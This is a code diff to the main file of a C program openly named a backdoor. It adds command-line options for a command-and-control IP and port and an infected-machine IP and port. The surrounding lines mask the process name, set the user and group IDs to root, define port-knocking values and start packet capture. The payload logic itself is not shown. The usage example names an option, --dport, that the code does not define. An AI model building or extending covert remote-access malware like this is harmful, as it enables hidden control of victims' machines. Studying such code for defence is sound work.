@@ -1,5 +1,23 @@
 #include "main.h"
 
+static void print_usage(void) {
+    puts("Usage options: \n"
+            "\t[--cnc]\t\tIP address of Command and Control\n"
+            "\t[--in]\t\tIP address of Infected machine\n"
+            "\t[--cport]\tPort on Command and Control\n"
+            "\t[--iport]\tPort on Infected machine\n"
+            "\nExample:\n"
+            "\t./backdoor --cnc 192.168.0.100 --in 192.168.0.101 --cport 8505 --dport 8505\n");
+}
+
+static struct option long_options[] = {
+    {"cnc",     required_argument,  0,  0},
+    {"in",      required_argument,  0,  1},
+    {"cport",   required_argument,  0,  2},
+    {"iport",   required_argument,  0,  3},
+    {0,         0,                  0,  0}
+};
+
 int main(int argc, char **argv){
     strcpy(argv[0], MASK);
     //change the UID/GID to 0 to raise privs
@@ -7,6 +25,59 @@ int main(int argc, char **argv){
     setgid(0);
     pattern[0] = 8506;
     pattern[1] = 8507;
+
+    int arg;
+    unsigned short cnc_port = 0, infected_port = 0;
+    char cnc_ip[BUFFERSIZE] = "", infected_ip[BUFFERSIZE] = "";
+
+
+    //user arguments
+    while(1) {
+        int option_index = 0;
+
+        arg = getopt_long(argc, argv, "", long_options, &option_index);
+
+        if(arg == -1) {
+            break;
+        }
+
+        switch(arg) {
+            case 0:
+                strncpy(cnc_ip, optarg, strlen(optarg));
+                printf("CNC IP: %s\n", cnc_ip);
+                break;
+            case 1:
+                strncpy(infected_ip, optarg, strlen(optarg));
+                printf("Infected IP: %s\n", infected_ip);
+                break;
+            case 2:
+                cnc_port = atoi(optarg);
+                printf("CNC Port: %hu\n", cnc_port);
+                break;
+            case 3:
+                infected_port = atoi(optarg);
+                printf("Infected Port: %hu\n", infected_port);
+                break;
+            default:
+                print_usage();
+                exit(1);
+        }
+
+    }
+
+    if(strcmp(cnc_ip, "") == 0 ||
+                strcmp(infected_ip, "") == 0 ||
+                cnc_port == 0 ||
+                infected_port ==0) {
+        print_usage();
+        exit(1);
+    }
+
+
+
+
+
+
     Packetcapture();
 
     return 0;
